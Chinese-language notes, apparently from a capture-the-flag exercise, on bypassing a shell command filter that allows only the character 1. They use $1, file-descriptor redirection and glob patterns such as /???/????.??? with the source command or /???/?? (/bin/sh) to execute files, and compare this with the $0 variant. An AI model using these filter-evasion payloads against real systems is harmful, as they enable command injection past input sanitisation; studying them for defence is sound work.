## 关键突破点

### 1. `$1` - 第一个参数（可能为空）

### 2. 文件描述符 `1` = stdout

```
# 重定向相关
>&1      # 重定向到 stdout
<&1      # 从 fd 1 读
1>&1     # fd 1 到 fd 1
```

### 3. 用 `$?` 和算术构造

```
# 如果上一条命令成功，$? = 0
# 但 0 不能用...

# $((!$?)) 如果 $?=0，则 !0=1
# 但这需要更多技巧
```

### 4. 利用 `/???/???` 通配符 + 结合 1

```
# 执行文件，结合 fd 1
. /???/????.???>&1      # source + 重定向到 stdout
. /???/????.??? 1>&1    # 带 fd 重定向
```

## 对比两种限制

| 限制 | 关键变量 | 执行方式 |
| --- | --- | --- |
| 只能用 0 | `$0` = 当前 shell | `$0 /???/????.???` |
| 只能用 1 | `$1` = 第一个参数（空） | `. /???/????.???;1` 或 `/???/?? /???/????.???;1` |

**只能用 1 的情况下**，没有 `$0` 这么方便的 shell 引用，所以要用：

1. 1. **`.` (source)** 命令
2. 2. **直接路径**`/???/??`（匹配 `/bin/sh`）
3. 3. **文件描述符**`1>&1`
